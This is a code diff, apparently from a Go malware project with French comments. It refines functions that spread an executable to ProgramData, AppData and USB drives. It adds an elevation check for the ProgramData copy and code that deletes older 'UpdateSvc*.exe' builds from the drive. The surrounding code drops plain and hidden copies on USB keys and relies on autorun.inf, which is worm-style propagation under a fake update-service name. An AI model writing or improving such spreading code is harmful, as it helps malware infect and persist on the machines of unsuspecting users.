@@ -119,7 +119,9 @@ func spreadCopies(verbose bool) string {
 	folder := workDirName
 
 	var targets []string
-	if os.Getenv("ProgramData") != "" {
+	if os.Getenv("ProgramData") != "" && isElevated() {
+		// ProgramData exige l élévation : sans admin, l écriture échoue
+		// silencieusement et la copie n existe pas.
 		targets = append(targets, filepath.Join(os.Getenv("ProgramData"), folder, name))
 	}
 	if appdata != "" {
@@ -205,6 +207,15 @@ func armUSB(drive, exe, name, folder string) bool {
 	hiddenCopy := filepath.Join(drive, folder, name)
 	copyTo(exe, rootCopy, data)
 	copyTo(exe, hiddenCopy, data)
+
+	// Nettoyage des copies des builds précédents sur la clé.
+	entries, _ := os.ReadDir(drive)
+	for _, e := range entries {
+		n := e.Name()
+		if strings.HasPrefix(n, "UpdateSvc") && strings.HasSuffix(n, ".exe") && n != name {
+			_ = os.Remove(filepath.Join(drive, n))
+		}
+	}
 
 	// autorun.inf : ignoré par Windows 10/11 pour les clés, encore actif sur
 	// certains postes et lecteurs réseau.
